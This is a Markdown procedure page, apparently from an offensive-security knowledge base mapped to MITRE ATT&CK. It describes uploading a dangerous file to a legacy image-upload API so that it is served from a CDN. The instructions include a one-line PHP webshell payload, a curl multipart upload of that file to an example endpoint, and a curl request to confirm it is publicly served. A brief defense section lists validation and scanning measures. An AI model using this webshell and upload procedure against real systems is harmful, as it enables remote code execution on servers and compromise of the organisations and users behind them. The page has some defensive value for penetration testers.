---
tags:
  - file-upload
  - dangerous-type
  - CDN
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-file-upload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T05:32:13.152Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 0325488b-532c-41e2-a198-8a498953c671
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Upload-Dangerous-File-Type-to-CDN

## Summary

This procedure exploits the lack of file type validation in a legacy image upload API to submit a dangerous file (e.g., executable script), resulting in its direct storage and public serving via the organization's CDN.

## Description

Legacy APIs for image uploads frequently accept any MIME type without sanitization, allowing attackers to upload malicious payloads like PHP shells or HTML files that can execute or phish when served. The attack targets the endpoint's processing logic, which forwards files to the CDN unchanged. Expected outcomes include the file being accessible at a public CDN URL, potentially leading to remote code execution or data exfiltration if the CDN serves dynamic content.

## Requirements

1. Confirmed accessible API endpoint from prior reconnaissance.
2. A prepared malicious file (e.g., rename a .php shell to .jpg).
3. HTTP client for multipart form uploads.

## Defense

Defensive measures and detection strategies:

- Validate and sanitize uploaded file types, extensions, and contents (e.g., using magic bytes).
- Scan uploads for malware before CDN storage.
- Log and alert on anomalous MIME types or file sizes in upload requests.

## Objectives

1. Successfully upload a non-image file without rejection.
2. Confirm storage and public accessibility on the CDN.
3. Demonstrate potential for malicious content execution.

## Instructions

### Step 1: Prepare Malicious File

**Context**: Create or select a dangerous file, such as a simple PHP webshell, and optionally disguise its extension.

No command needed; manually prepare `malicious.php` with content like `<?php system($_GET['cmd']); ?>`.

### Step 2: Execute Upload

**Context**: Submit the file via multipart POST to the API, mimicking a legitimate image upload.

**Command** ([[commands/curl-file-upload]]):
```bash
curl -X POST -F "file=@malicious.php" https://api.example.com/upload-image
```

> This uploads the file with its specified MIME type (e.g., application/x-php). Expected output: JSON response with CDN URL, like {"url": "https://cdn.example.com/malicious.php"}.

### Step 3: Verify CDN Serving

**Context**: Access the returned CDN URL to confirm the file is publicly served without restrictions.

**Command** ([[commands/curl-file-upload]]):
```bash
curl https://cdn.example.com/malicious.php
```

> Output should display the file contents, indicating successful unrestricted serving.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques


## Commands Used

- [[commands/curl-file-upload]]

## Tools Used


## Tags

- [[file-upload]]
- [[dangerous-type]]
